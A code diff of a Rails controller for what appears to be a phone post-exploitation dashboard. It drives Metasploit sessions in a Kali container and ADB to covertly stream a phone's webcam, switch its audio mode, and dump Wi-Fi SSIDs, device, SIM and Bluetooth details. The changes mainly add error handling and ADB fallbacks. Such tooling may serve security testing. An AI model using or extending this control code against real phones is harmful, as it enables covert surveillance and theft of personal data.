@@ -3,44 +3,58 @@ class SmartphonesController < InheritedResources::Base
   @@isWebcamRecordOn=false
 
   def dump_sysinfo
-    processCommand="sysinfo"
-    commandOutput=start_msf_process(processCommand)
-    respond_to do |format|
-        format.js { render "dump_sysinfo", :locals => {:commandOutput => commandOutput}  }
+      begin
+          processCommand="sysinfo"
+          commandOutput=start_msf_process(processCommand)
+      rescue
+          puts "Error on dump sysinfo."
+          commandOutput=["Operation Failed"]
+      end
+      respond_to do |format|
+          format.js { render "dump_sysinfo", :locals => {:commandOutput => commandOutput}  }
       end
   end
 
+
+
+
+
   def webcam_record
-    commandOutput=[]
-    if !@@isWebcamRecordOn
-        commandTimeout=params[:exec_timeout].to_i
-        camera=params[:back_camera] == "true" ? '1' : '2'
-        currentTime = DateTime.now
-        currentTimeFormat=currentTime.strftime("%Y%m%d%H%M%S")
-        @fileNameJpeg= "webcam_record_" + currentTimeFormat + '.jpeg'
-        @fileNameHtml= "webcam_record_" + currentTimeFormat + '.html'
-        processCommand="webcam_stream -v false -i #{camera} -s #{@fileNameJpeg} -t #{@fileNameHtml}"
-        commandOutput=start_msf_process(processCommand)
-        isOperationSuccessful=false
-        1.upto(commandTimeout) do |n|
-            if system("docker exec kali_container sh -c \"ls | grep #{@fileNameHtml}\"")
-              isOperationSuccessful = true
-              @@isWebcamRecordOn = true
-              break
-            else
-                puts "Waiting ..."
+    begin
+        commandOutput=[]
+        if !@@isWebcamRecordOn
+            commandTimeout=params[:exec_timeout].to_i
+            camera=params[:back_camera] == "true" ? '1' : '2'
+            currentTime = DateTime.now
+            currentTimeFormat=currentTime.strftime("%Y%m%d%H%M%S")
+            @fileNameJpeg= "webcam_record_" + currentTimeFormat + '.jpeg'
+            @fileNameHtml= "webcam_record_" + currentTimeFormat + '.html'
+            processCommand="webcam_stream -v false -i #{camera} -s #{@fileNameJpeg} -t #{@fileNameHtml}"
+            commandOutput=start_msf_process(processCommand)
+            isOperationSuccessful=false
+            1.upto(commandTimeout) do |n|
+                if system("docker exec kali_container sh -c \"ls | grep #{@fileNameHtml}\"")
+                  isOperationSuccessful = true
+                  @@isWebcamRecordOn = true
+                  break
+                else
+                    puts "Waiting ..."
+                end
+                sleep 1
             end
-            sleep 1
+            commandOutput=["Operation Failed"] if not isOperationSuccessful
+        else
+            commandOutput.append('Control+Z')
+            commandOutput.append(detach_session)
+            @@isWebcamRecordOn = false
         end
-        commandOutput=["Operation Failed"] if not isOperationSuccessful
-    else
-        commandOutput.append('Control+Z')
-        commandOutput.append(detach_session)
-        @@isWebcamRecordOn = false
+    rescue
+        puts "Error on webcam record."
+        commandOutput=["Operation Failed"]
     end
     respond_to do |format|
         format.js { render "webcam_record", :locals => {:commandOutput => commandOutput, :fileName => @fileNameHtml}  }
-      end
+    end
 end
 
 
@@ -48,12 +62,17 @@ end
 
 
 def set_audio_mode
-  processCommand="set_audio_mode -m #{@@soundMode}"
-  commandOutput=start_msf_process(processCommand)
-  @@soundMode=@@soundMode == 2 ? 0 : 2
+  begin
+      processCommand="set_audio_mode -m #{@@soundMode}"
+      commandOutput=start_msf_process(processCommand)
+      @@soundMode=@@soundMode == 2 ? 0 : 2
+  rescue
+      puts "Error on set audio mode."
+      commandOutput=["Operation Failed"]
+  end
   respond_to do |format|
       format.js { render "set_audio_mode", :locals => {:commandOutput => commandOutput}  }
-    end
+  end
 end
 
 
@@ -63,7 +82,7 @@ end
 def dump_wifi_info
     begin
         if @@isAdbConnected
-            commandOutput=run_adb_command('shell "dumpsys wifi | grep SSID: | grep -v rt="')
+            commandOutput=run_adb_command('shell "dumpsys wifi | grep SSID: | grep -v rt="').split("\n")
         else
             start_msf_process("shell")
             processCommand='dumpsys wifi | grep SSID: | grep -v rt='
@@ -75,7 +94,7 @@ def dump_wifi_info
         puts "Error dumping wi-fi info."
     end
     respond_to do |format|
-        format.js { render "dump_wifi_info", :locals => {:commandOutput => commandOutput.split('\n')}  }
+        format.js { render "dump_wifi_info", :locals => {:commandOutput => commandOutput}  }
     end
 end
 
@@ -84,10 +103,19 @@ end
 
 
 def dump_localtime
-  processCommand="localtime"
-  commandOutput=start_msf_process(processCommand)
-  respond_to do |format|
-      format.js { render "dump_localtime", :locals => {:commandOutput => commandOutput}  }
+    begin
+        if @@isAdbConnected
+            commandOutput=run_adb_command('shell date').split("\n")
+        else
+            processCommand="localtime"
+            commandOutput=start_msf_process(processCommand)
+        end
+    rescue
+        puts "Error on dump localtime."
+        commandOutput=["Operation Failed"]
+    end
+    respond_to do |format|
+        format.js { render "dump_localtime", :locals => {:commandOutput => commandOutput}  }
     end
 end
 
@@ -167,8 +195,12 @@ end
 
 def wake_lock
     begin
-        processCommand="wakelock -w"
-        commandOutput=start_msf_process(processCommand)
+        if @@isAdbConnected
+            commandOutput=run_adb_command("shell input keyevent 82")
+        else
+            processCommand="wakelock -w"
+            commandOutput=start_msf_process(processCommand)
+        end
     rescue
         puts "Error unlocking screen"
         commandOutput="Operation Failed"
@@ -250,7 +282,11 @@ end
 def dump_device_info
     begin
         if @@isAdbConnected
-            commandOutput=run_adb_command('shell "getprop ro.product.model"').split("\n")
+            commandOutput=run_adb_command('shell "getprop ro.product.brand"').split("\n") \
+                        + run_adb_command('shell "getprop ro.product.model"').split("\n") \
+                        + run_adb_command('shell "getprop gsm.sim.operator.alpha"').split("\n") \
+                        + run_adb_command('shell "getprop ro.config.bluetooth.name"').split("\n") 
+
         else
             start_msf_process("shell")
             processCommand='getprop ro.product.model'
